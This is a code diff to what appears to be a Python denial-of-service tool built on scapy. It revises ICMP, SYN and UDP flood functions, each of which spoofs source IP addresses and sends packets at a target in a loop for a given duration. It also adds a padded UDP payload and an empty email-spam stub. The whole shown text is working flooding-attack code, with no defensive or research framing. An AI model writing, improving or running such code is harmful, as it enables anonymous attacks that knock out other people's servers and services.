@@ -20,7 +20,7 @@ class Layer3:
         end_t = timing.time() + time
         IP_Packets = []
         for i in range(ICMP_PACKET_AMOUNT):
-            IP_Packets.append(IP(dst=str(target), src=Spoof_IP())/ICMP())
+            IP_Packets.append(scapy.all.IP(dst=str(target), src=Spoof_IP())/scapy.all.ICMP())
         while(timing.time() < end_t):
             send(IP_Packets, verbose=0)
             time.sleep(8)
@@ -29,18 +29,23 @@ class Layer4:
     @staticmethod
     def SYN_Flood(target: str, port: int, time: int):
         end_t = timing.time() + time
-        IP_Packet = IP(dst=str(target), src=Spoof_IP())
-        TCP_Packet = TCP(sport=randInt(), dport=int(port), flags="S", seq=randInt(), window=randInt())
+        IP_Packet = scapy.all.IP(dst=str(target), src=Spoof_IP())
+        TCP_Packet = scapy.all.TCP(sport=randInt(), dport=int(port), flags="S", seq=randInt(), window=randInt())
         while(timing.time() < end_t):
             send(IP_Packet/TCP_Packet, verbose=0)
 
     @staticmethod
     def UDP_Flood(target: str, port: int, time: int):
         end_t = timing.time() + time
-        IP_Packet = IP(dst=str(target), src=Spoof_IP())
-        UDP_Packet = UDP(sport=randInt(), dport=int(port))
+        IP_Packet = scapy.all.IP(dst=str(target), src=Spoof_IP())
+        UDP_Packet = scapy.all.UDP(sport=randInt(), dport=int(port))
+        payload = "A" * 450
         while(timing.time() < end_t):
-            send(IP_Packet/UDP_Packet, verbose=0)
+            send(IP_Packet/UDP_Packet/payload, verbose=0)
+            
+    @staticmethod
+    def EMAIL_Spam(target: str, time: int):
+        pass
 
 class Layer7:
     @staticmethod
